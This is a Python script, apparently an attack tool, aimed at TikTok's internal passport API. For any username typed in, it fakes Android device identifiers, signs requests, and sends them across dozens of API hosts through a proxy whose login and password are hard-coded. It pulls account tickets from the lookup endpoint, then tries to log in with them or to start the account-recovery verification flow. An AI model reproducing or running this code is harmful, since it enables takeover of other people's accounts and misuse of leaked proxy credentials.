import requests
import time
import random
import secrets
import SignerPy
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading


class TikTokFlow:
    def __init__(self, username):
        self.username = username.strip()
        self.session = requests.Session()

        proxy = "infproxy_checkemail509:NLI8oq4ZQC2fJ3yJDcSv@proxy.infiniteproxies.com:1111"
        self.proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

        self.hosts = [  # نفس الهوستات بدون حذف
            "api16-core-aion-useast5.us.tiktokv.com",
            "api16-core-apix-quic.tiktokv.com",
            "api16-core-apix.tiktokv.com",
            "api16-core-baseline.tiktokv.com",
            "api16-core-c-alisg.tiktokv.com",
            "api16-core-c-useast1a.tiktokv.com",
            "api16-core-quic.tiktokv.com",
            "api16-core-useast5.us.tiktokv.com",
            "api16-core-useast8.us.tiktokv.com",
            "api16-core-va.tiktokv.com",
            "api16-core-ycru.tiktokv.com",
            "api16-core-zr.tiktokv.com",
            "api16-core.tiktokv.com",
            "api16-core.ttapis.com",
            "api16-normal-aion-useast5.us.tiktokv.com",
            "api16-normal-apix-quic.tiktokv.com",
            "api16-normal-apix.tiktokv.com",
            "api16-normal-baseline.tiktokv.com",
            "api16-normal-c-alisg.tiktokv.com",
            "api16-normal-c-useast1a.tiktokv.com",
            "api16-normal-c-useast1a.musical.ly",
            "api16-normal-no1a.tiktokv.eu",
            "api16-normal-quic.tiktokv.com",
            "api16-normal-useast5.tiktokv.us",
            "api16-normal-useast5.us.tiktokv.com",
            "api16-normal-useast8.us.tiktokv.com",
            "api16-normal-va.tiktokv.com",
            "api16-normal-vpc2-useast5.us.tiktokv.com",
            "api16-normal-zr.tiktokv.com",
            "api16-normal.tiktokv.com",
            "api16-normal.ttapis.com",
            "api19-core-c-alisg.tiktokv.com",
            "api19-core-c-useast1a.tiktokv.com",
            "api19-core-useast5.us.tiktokv.com",
            "api19-core-va.tiktokv.com",
            "api19-core-zr.tiktokv.com",
            "api19-core.tiktokv.com",
            "api19-normal-c-alisg.tiktokv.com",
            "api19-normal-c-useast1a.musical.ly",
            "api19-normal-c-useast1a.tiktokv.com",
            "api19-normal-useast5.us.tiktokv.com",
            "api19-normal-va.tiktokv.com",
            "api19-normal-zr.tiktokv.com",
            "api19-normal.tiktokv.com"
        ]

        self.base_params = {
            "device_platform": "android",
            "ssmix": "a",
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "370805",
            "manifest_version_code": "2023708050",
            "os_version": "10",
            "device_type": f"rk{random.randint(3000,4000)}",
            "device_id": str(random.randint(10**18, 10**19-1)),
            "iid": str(random.randint(10**18, 10**19-1)),
            "openudid": secrets.token_hex(8),
            "language": "ar",
            "timezone_name": "Asia/Riyadh",
            "region": "SA",
        }

        self.headers = {
            "User-Agent": f"com.zhiliaoapp.musically/{self.base_params['manifest_version_code']}"
        }

    def build_headers(self, params):
        sig = SignerPy.sign(params=params)
        h = self.headers.copy()
        h.update(sig)
        return h

    def fresh_params(self):
        p = self.base_params.copy()
        ts = int(time.time())
        p["ts"] = ts
        p["_rticket"] = ts * 1000
        return p

    # =========================
    # LOOKUP (FAST + STOP ON HIT)
    # =========================
    def _lookup(self, host):
        try:
            params = self.fresh_params()
            params["account_param"] = self.username

            r = self.session.post(
                f"https://{host}/passport/account_lookup/username/",
                params=params,
                headers=self.build_headers(params),
                proxies=self.proxy_dict,
                timeout=5
            )

            j = r.json()
            acc = j.get("data", {}).get("accounts", [])

            if acc:
                a = acc[0]

                return {
                    "host": host,
                    "raw": r.text,
                    "ticket": a.get("passport_ticket") or a.get("not_login_ticket"),
                    "oauth": a.get("oauth_login_only", False)
                }

        except:
            return None

    def get_ticket(self):
        result = None

        with ThreadPoolExecutor(max_workers=25) as ex:
            futures = {ex.submit(self._lookup, h): h for h in self.hosts}

            for f in as_completed(futures):
                res = f.result()
                if res:
                    result = res
                    print("\n🔥 LOOKUP HIT ->", res["host"])
                    print(res["raw"])
                    break

        if result:
            return result["ticket"], result["oauth"], result

        return None, None, None

    # =========================
    # SAFE (STOP FIRST MATCH)
    # =========================
    def safe(self, ticket):
        lock = threading.Lock()
        result = {"found": False, "data": None}

        def run(host):
            try:
                if result["found"]:
                    return

                params = self.fresh_params()
                params["not_login_ticket"] = ticket
                params["target"] = "recover_account"

                r = self.session.get(
                    f"https://{host}/passport/shark/safe_verify/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                if "2029" in r.text:
                    with lock:
                        result["found"] = True
                        result["data"] = {
                            "host": host,
                            "raw": r.text
                        }

            except:
                pass

        with ThreadPoolExecutor(max_workers=25) as ex:
            list(ex.map(run, self.hosts))

        return result["data"]

    # =========================
    # AUTH
    # =========================
    def auth(self, ticket):
        lock = threading.Lock()
        result = None

        def run(host):
            nonlocal result
            try:
                if result:
                    return

                params = self.fresh_params()
                params["not_login_ticket"] = ticket

                r = self.session.get(
                    f"https://{host}/passport/auth/available_ways/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                if "success" in r.text:
                    with lock:
                        result = {
                            "host": host,
                            "raw": r.text
                        }

            except:
                pass

        with ThreadPoolExecutor(max_workers=25) as ex:
            list(ex.map(run, self.hosts))

        return result

    # =========================
    # LOGIN
    # =========================
    def login(self, ticket):
        lock = threading.Lock()
        result = None

        def run(host):
            nonlocal result
            try:
                if result:
                    return

                params = self.fresh_params()
                params["passport_ticket"] = ticket

                r = self.session.post(
                    f"https://{host}/passport/user/login_by_passport_ticket/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                with lock:
                    result = {
                        "host": host,
                        "status": r.status_code,
                        "raw": r.text
                    }

            except:
                pass

        with ThreadPoolExecutor(max_workers=25) as ex:
            list(ex.map(run, self.hosts))

        return result


# =========================
# RUN
# =========================
if __name__ == "__main__":
    user = input("Enter username: ")
    flow = TikTokFlow(user)

    ticket, oauth, lookup_res = flow.get_ticket()

    print("\n🎫 Ticket:", ticket)
    print("🔐 AUTH:", oauth)

    if not oauth:
        print("\n🔥 LOGIN:", flow.login(ticket))

    else:
        safe_res = flow.safe(ticket)
        print("\n🔥 SAFE:", safe_res)

        if safe_res:
            print("\n🔥 AUTH:", flow.auth(ticket))
